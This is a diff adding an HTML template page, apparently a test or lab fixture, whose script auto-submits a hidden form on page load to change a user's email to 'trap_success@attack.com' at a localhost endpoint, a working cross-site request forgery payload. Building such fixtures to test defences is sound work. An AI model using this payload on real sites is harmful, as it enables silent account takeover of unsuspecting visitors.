@@ -1,0 +1,20 @@
+{{template "header.html" .}}
+
+<script>
+    var referrer = document.referrer;
+    var result = referrer.split('/');
+    var form = document.createElement('form');
+
+    form.method = 'POST';
+    form.action = 'http://localhost:8000/change_email';
+    document.body.appendChild(form);
+
+    var request = document.createElement('input');
+    request.setAttribute('name', 'email');
+    request.setAttribute('value', 'trap_success@attack.com');
+    form.appendChild(request);
+
+    form.submit();
+</script>
+
+{{template "footer.html" .}}
